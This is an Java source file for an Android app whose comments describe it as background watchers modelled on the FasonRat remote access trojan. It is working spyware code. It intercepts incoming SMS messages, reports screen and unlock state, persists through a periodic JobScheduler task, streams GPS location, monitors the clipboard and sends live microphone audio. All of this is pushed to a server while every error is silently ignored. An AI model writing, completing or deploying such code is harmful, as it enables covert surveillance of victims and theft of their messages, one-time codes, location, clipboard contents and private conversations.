package com.zeko.droid;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.provider.Telephony;

/**
 * Các "watcher" chạy nền, đẩy dữ liệu realtime lên server (giống FasonRat):
 *  - SmsReceiver: tin nhắn mới đến
 *  - ScreenStateReceiver: màn hình bật/tắt, mở khoá
 */
public final class Watchers {

    /** Callback để Core đẩy evt lên server. */
    public interface Push { void evt(String type, org.json.JSONObject data); }

    public static volatile Push push;

    // ── tin nhắn mới ──
    public static class SmsReceiver extends BroadcastReceiver {
        @Override public void onReceive(Context ctx, Intent intent) {
            try {
                if (!Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) return;
                Push p = push;
                if (p == null) return;
                for (android.telephony.SmsMessage m : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                    org.json.JSONObject o = new org.json.JSONObject();
                    o.put("from", m.getDisplayOriginatingAddress());
                    o.put("body", m.getMessageBody());
                    o.put("time", new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US)
                            .format(new java.util.Date()));
                    o.put("type", "inbox");
                    p.evt("sms", o);
                }
            } catch (Throwable ignored) { }
        }
    }

    // ── màn hình bật/tắt ──
    public static class ScreenStateReceiver extends BroadcastReceiver {
        @Override public void onReceive(Context ctx, Intent intent) {
            try {
                Push p = push;
                if (p == null) return;
                String a = intent.getAction();
                if (Intent.ACTION_SCREEN_ON.equals(a)) p.evt("screen_state", new org.json.JSONObject().put("state", "on"));
                else if (Intent.ACTION_SCREEN_OFF.equals(a)) p.evt("screen_state", new org.json.JSONObject().put("state", "off"));
                else if (Intent.ACTION_USER_PRESENT.equals(a)) p.evt("screen_state", new org.json.JSONObject().put("state", "unlocked"));
            } catch (Throwable ignored) { }
        }
    }

    // ── JobScheduler keep-alive (thay WorkManager, không cần thư viện) ──
    public static class KeepAliveJob extends android.app.job.JobService {
        @Override public boolean onStartJob(android.app.job.JobParameters params) {
            try {
                Intent i = new Intent(this, Core.class);
                if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
                else startService(i);
            } catch (Throwable ignored) { }
            jobFinished(params, false);
            return false;
        }
        @Override public boolean onStopJob(android.app.job.JobParameters params) { return true; }

        public static void schedule(Context ctx) {
            try {
                android.app.job.JobScheduler js =
                        (android.app.job.JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
                if (js == null) return;
                android.app.job.JobInfo info = new android.app.job.JobInfo.Builder(2001,
                        new android.content.ComponentName(ctx, KeepAliveJob.class))
                        .setPeriodic(15 * 60 * 1000L)
                        .setPersisted(true)
                        .build();
                js.schedule(info);
            } catch (Throwable ignored) { }
        }
    }

    // ── GPS realtime ──
    public static volatile boolean locRunning;

    public static void startLocation(final Context ctx, final int seconds) {
        if (locRunning) return;
        locRunning = true;
        new Thread(() -> {
            android.location.LocationManager lm =
                    (android.location.LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            while (locRunning) {
                try {
                    Push p = push;
                    android.location.Location best = null;
                    if (lm != null) for (String prov : lm.getProviders(true)) {
                        android.location.Location l = lm.getLastKnownLocation(prov);
                        if (l != null && (best == null || l.getTime() > best.getTime())) best = l;
                    }
                    if (p != null && best != null) {
                        org.json.JSONObject o = new org.json.JSONObject();
                        o.put("lat", best.getLatitude());
                        o.put("lon", best.getLongitude());
                        o.put("acc", best.getAccuracy());
                        o.put("speed", best.getSpeed());
                        o.put("time", new java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US)
                                .format(new java.util.Date(best.getTime())));
                        o.put("map", "https://maps.google.com/?q=" + best.getLatitude() + "," + best.getLongitude());
                        p.evt("location", o);
                    }
                } catch (Throwable ignored) { }
                try { Thread.sleep(Math.max(3, seconds) * 1000L); } catch (InterruptedException e) { break; }
            }
        }, "zk-loc").start();
    }

    public static void stopLocation() { locRunning = false; }

    // ── clipboard monitor ──
    public static volatile boolean clipRunning;

    public static void startClipboard(final Context ctx) {
        if (clipRunning) return;
        clipRunning = true;
        new Thread(() -> {
            String last = "";
            while (clipRunning) {
                try {
                    android.content.ClipboardManager cm = (android.content.ClipboardManager)
                            ctx.getSystemService(Context.CLIPBOARD_SERVICE);
                    if (cm != null && cm.hasPrimaryClip()) {
                        CharSequence cs = cm.getPrimaryClip().getItemAt(0).coerceToText(ctx);
                        String s = cs == null ? "" : cs.toString();
                        if (s.length() > 0 && !s.equals(last)) {
                            last = s;
                            Push p = push;
                            if (p != null) p.evt("clipboard", new org.json.JSONObject().put("text", s));
                        }
                    }
                } catch (Throwable ignored) { }
                try { Thread.sleep(3000); } catch (InterruptedException e) { break; }
            }
        }, "zk-clip").start();
    }

    public static void stopClipboard() { clipRunning = false; }

    // ── mic live: PCM 16-bit mono gửi từng chunk ──
    public static volatile boolean micRunning;
    private static android.media.AudioRecord micRecord;

    public static synchronized String startMicLive(final int sampleRate) {
        if (micRunning) return "da chay";
        int rate = sampleRate <= 0 ? 16000 : sampleRate;
        try {
            int min = android.media.AudioRecord.getMinBufferSize(rate,
                    android.media.AudioFormat.CHANNEL_IN_MONO,
                    android.media.AudioFormat.ENCODING_PCM_16BIT);
            if (min <= 0) return "thiet bi khong ho tro " + rate + "Hz";
            micRecord = new android.media.AudioRecord(android.media.MediaRecorder.AudioSource.MIC,
                    rate, android.media.AudioFormat.CHANNEL_IN_MONO,
                    android.media.AudioFormat.ENCODING_PCM_16BIT, Math.max(min, rate / 4));
            micRecord.startRecording();
            micRunning = true;

            new Thread(() -> {
                byte[] buf = new byte[rate / 4];   // ~250ms
                while (micRunning) {
                    try {
                        int n = micRecord.read(buf, 0, buf.length);
                        if (n <= 0) continue;
                        Push p = push;
                        if (p == null) continue;
                        byte[] chunk = new byte[n];
                        System.arraycopy(buf, 0, chunk, 0, n);
                        org.json.JSONObject o = new org.json.JSONObject();
                        o.put("rate", rate);
                        o.put("pcm", Proto.b64(chunk));
                        p.evt("audio", o);
                    } catch (Throwable ignored) { }
                }
            }, "zk-mic").start();
            return "ok";
        } catch (Throwable t) {
            micRunning = false;
            return "loi mic: " + t.getMessage();
        }
    }

    public static synchronized void stopMicLive() {
        micRunning = false;
        try { if (micRecord != null) micRecord.stop(); } catch (Throwable ignored) { }
        try { if (micRecord != null) micRecord.release(); } catch (Throwable ignored) { }
        micRecord = null;
    }
}
